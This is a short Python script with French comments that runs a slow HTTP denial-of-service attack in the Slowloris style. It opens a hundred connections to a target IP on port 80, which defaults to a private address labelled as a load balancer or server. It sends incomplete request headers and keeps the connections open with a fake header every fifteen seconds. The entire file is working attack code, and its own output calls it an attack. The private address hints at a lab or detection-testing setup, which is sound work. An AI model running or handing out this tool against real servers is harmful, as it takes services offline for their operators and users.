#!/usr/bin/env python3
import socket
import random
import time
import sys

target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.100"  # IP du Load Balancer ou Serveur cible
port = 80
connection_count = 100
sockets = []

print(f"[Attaque] Initialisation de {connection_count} connexions lentes vers {target_ip}...")

# Création des connexions
for i in range(connection_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en;\r\n".encode("utf-8"))
        sockets.append(s)
    except socket.error:
        break

print(f"[Attaque] {len(sockets)} connexions actives. Maintien en cours (envoi de headers toutes les 15s)...")

# Maintien des connexions ouvertes (Signature Slow DoS)
while True:
    print("Envoi du keep-alive header...")
    for s in list(sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        except socket.error:
            sockets.remove(s)
    
    if len(sockets) == 0:
        print("Toutes les connexions ont été fermées par le serveur. Relance...")
        break
    time.sleep(15)
